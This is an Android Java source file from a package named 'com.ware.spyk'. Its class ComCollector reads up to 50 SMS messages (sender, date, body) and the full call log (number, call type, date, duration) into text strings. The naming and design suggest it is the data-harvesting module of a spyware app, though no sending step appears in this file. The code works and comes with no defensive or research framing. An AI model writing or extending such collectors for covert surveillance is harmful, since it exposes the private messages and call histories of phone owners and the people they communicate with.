package com.ware.spyk;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.Telephony;
import android.util.Log;

import androidx.core.app.ActivityCompat;

public class ComCollector {

    private static final String TAG = "ComCollector";

    public static String readSMS(Context context , Integer limit) {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Permission READ_SMS manquante !");
            return "Permission manquante.";
        }

        StringBuilder smsData = new StringBuilder();
        Cursor cursor = context.getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null,
                null,
                null,
                Telephony.Sms.DEFAULT_SORT_ORDER);

        limit = (limit == null) ? 50 : limit;

        if (cursor != null) {
            while (cursor.moveToNext() && limit > 0) {
                String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                String date = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));

                smsData.append("From: ").append(address)
                        .append("\nDate: ").append(date)
                        .append("\nMessage: ").append(body)
                        .append("\n\n");

                limit--;
            }
            cursor.close();
        }

        return smsData.toString();
    }

    public static String readCallLogs(Context context) {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Permission READ_CALL_LOG manquante !");
            return "Permission manquante.";
        }

        StringBuilder callLogData = new StringBuilder();
        Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null,
                null,
                null,
                CallLog.Calls.DATE + " DESC"
        );

        if (cursor != null) {
            while (cursor.moveToNext()) {
                String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                String type;
                int callType = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                String date = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                switch (callType) {
                    case CallLog.Calls.INCOMING_TYPE:
                        type = "Appel entrant";
                        break;
                    case CallLog.Calls.OUTGOING_TYPE:
                        type = "Appel sortant";
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        type = "Appel manqué";
                        break;
                    case CallLog.Calls.VOICEMAIL_TYPE:
                        type = "Répondeur";
                        break;
                    case CallLog.Calls.REJECTED_TYPE:
                        type = "Appel rejeté";
                        break;
                    case CallLog.Calls.BLOCKED_TYPE:
                        type = "Appel bloqué";
                        break;
                    case CallLog.Calls.ANSWERED_EXTERNALLY_TYPE:
                        type = "Appel répondu via un autre appareil (Bluetooth ou autre)";
                        break;
                    default:
                        type = "Type inconnu";
                        break;
                }
                callLogData.append("Number: ").append(number)
                        .append("\nType: ").append(type)
                        .append("\nDate: ").append(date)
                        .append("\nDuration: ").append(duration)
                        .append(" sec\n\n");
            }
            cursor.close();
        }

        return callLogData.toString();
    }
}
